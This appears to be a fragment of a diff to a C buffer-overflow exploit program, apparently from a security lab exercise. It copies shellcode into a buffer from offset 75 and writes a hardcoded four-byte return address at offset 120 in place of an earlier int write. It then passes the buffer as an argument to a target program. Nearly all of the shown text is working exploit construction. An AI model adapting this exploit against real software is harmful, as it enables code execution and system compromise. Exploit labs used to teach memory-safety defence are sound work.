@@ -24,9 +24,10 @@ main ( int argc, char * argv[] )
 		exploit[i]=shellcode[i-75];
 	}
 	
-	int *a = (int*)&exploit[120];
-	*a = ADDR;
-	
+	exploit[120] = '\x50';
+	exploit[121] = '\xfe';
+	exploit[122] = '\x21';
+	exploit[123] = '\x30';
 	exploit[124] = '\0';
 	
 	args[0] = TARGET;
